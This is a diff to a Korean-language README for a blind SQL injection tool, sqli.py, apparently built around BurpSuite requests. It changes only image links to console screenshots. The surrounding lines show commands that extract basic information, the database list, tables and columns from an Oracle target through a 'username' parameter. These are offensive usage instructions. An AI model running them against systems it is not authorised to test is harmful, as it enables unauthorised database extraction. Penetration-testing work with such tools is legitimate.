@@ -27,14 +27,14 @@ BurpSuite 요청 데이터에 참/거짓(1=1) 조건문을 포함한 데이터�
 
 기본 정보 추출:  
 `python sqli.py -s http --dbms oracle -p username -d oracle_result.db --basic `<br><br>
-  <img src="https://github.com/kazal92/Code/blob/main/images/console_result_basic.png" alt="설명"  style="width:70%;height:auto;">>  
+  <img src="https://github.com/kazal92/Code/blob/main/images/console_result_basic.png" alt="설명" style="width:70%;height:auto;">  
 DB 목록 추출:  
 `python sqli.py -s http --dbms oracle -p username -d oracle_result.db --dbs `
-<img src="images/console_result_dbs" alt="설명" width="400" height="300">  
+<img src="https://github.com/kazal92/Code/blob/main/images/console_result_dbs.png" alt="설명" style="width:70%;height:auto;">
 
 테이블 목록 추출:  
 `python sqli.py -s http --dbms oracle -p username -d oracle_result.db --tables -D C##KAZAL92`
-<img src="images/console_result_tables" alt="설명" width="400" height="300">  
+<img src="https://github.com/kazal92/Code/blob/main/images/console_result_tables.png" alt="설명" style="width:70%;height:auto;">
 컬럼 목록 추출:  
 `python sqli.py -s http --dbms oracle -p username -d oracle_result.db --columns -D C##KAZAL92 -T "'USERS', 'EXAMPLE_TABLE'"`
-<img src="images/console_result_columns" alt="설명" width="400" height="300">  
+<img src="https://github.com/kazal92/Code/blob/main/images/console_result_columns.png" alt="설명" style="width:70%;height:auto;">
